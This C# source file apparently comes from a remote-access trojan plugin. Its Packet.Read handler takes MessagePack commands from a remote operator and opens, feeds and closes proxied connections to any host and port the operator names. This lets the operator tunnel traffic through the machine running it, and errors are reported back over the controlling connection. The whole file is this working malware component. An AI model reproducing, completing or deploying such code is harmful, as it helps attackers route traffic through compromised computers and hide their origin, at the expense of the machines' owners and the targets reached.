using MessagePackLib.MessagePack;
using ReverseProxy.Handler;
using System;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            MsgPack unpack_msgpack = new MsgPack();
            unpack_msgpack.DecodeFromBytes((byte[])data);
            switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
            {
                case "ReverseProxy":
                    {
                        switch (unpack_msgpack.ForcePathObject("Option").AsString)
                        {
                            case "ReverseProxyConnect":
                                {
                                    int ConnectionId =0;
                                    int Port=0;
                                    string Target = unpack_msgpack.ForcePathObject("Target").AsString;
                                    try
                                    {
                                        ConnectionId = int.Parse(unpack_msgpack.ForcePathObject("ConnectionId").AsString);
                                    } catch(Exception ex) { Error(ex.Message); }
                                    try
                                    {
                                        Port = int.Parse(unpack_msgpack.ForcePathObject("Port").AsString);
                                    }
                                    catch (Exception ex) { Error(ex.Message); }
                                    lock (HandleReverseProxy._proxyClientsLock)
                                    {
                                        HandleReverseProxy._proxyClients.Add(new HandleReverseProxy(ConnectionId, Target, Port));
                                    }
                                    break;
                                }

                            case "ReverseProxyData":
                                {
                                    int ConnectionId = 0;
                                    try
                                    {
                                        ConnectionId = int.Parse(unpack_msgpack.ForcePathObject("ConnectionId").AsString);
                                    }
                                    catch (Exception ex) { Error(ex.Message); }

                                    byte[] Data = unpack_msgpack.ForcePathObject("Data").GetAsBytes();
                                    HandleReverseProxy handleReverseProxy; 
                                    try
                                    {                                        
                                        lock (HandleReverseProxy._proxyClientsLock)
                                        {
                                            handleReverseProxy=HandleReverseProxy._proxyClients.FirstOrDefault(t => t.ConnectionId == ConnectionId);
                                        }
                                        handleReverseProxy?.SendToTargetServer(Data);
                                    }
                                    catch 
                                    {
                                        lock (HandleReverseProxy._proxyClientsLock)
                                        {
                                            handleReverseProxy = HandleReverseProxy._proxyClients.FirstOrDefault(t => t.ConnectionId == ConnectionId);
                                        }
                                        handleReverseProxy.Disconnect(); 
                                    }
                                    break;
                                }

                            case "ReverseProxyDisconnect":
                                {
                                    int ConnectionId = 0;
                                    try
                                    {
                                        ConnectionId = int.Parse(unpack_msgpack.ForcePathObject("ConnectionId").AsString);
                                    }
                                    catch (Exception ex) { Error(ex.Message); }
                                    HandleReverseProxy socksClient;
                                    lock (HandleReverseProxy._proxyClientsLock)
                                    {
                                        socksClient = HandleReverseProxy._proxyClients.FirstOrDefault(t => t.ConnectionId == ConnectionId);
                                    }
                                    socksClient?.Disconnect();
                                    break;
                                }
                        }
                        break;
                    }
            }
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }
}